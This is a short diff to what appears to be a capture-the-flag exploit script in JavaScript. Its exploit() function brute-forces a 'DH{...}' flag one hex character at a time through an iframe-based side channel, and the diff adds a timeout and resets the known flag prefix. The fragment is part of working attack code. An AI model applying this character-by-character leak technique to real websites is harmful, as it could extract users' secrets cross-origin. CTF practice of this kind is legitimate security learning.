@@ -17,12 +17,17 @@
                 document.body.removeChild(iframe);
                 resolve(result != 0);
             };
+
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                resolve(false);
+            }, 3000);
         });
     }
 
     async function exploit() {
         let chars = "0123456789abcdef}";
-        let secret = "DH{22d";
+        let secret = "DH{";
         const img = document.getElementById("img");
 
         while (!secret.includes("}")) {
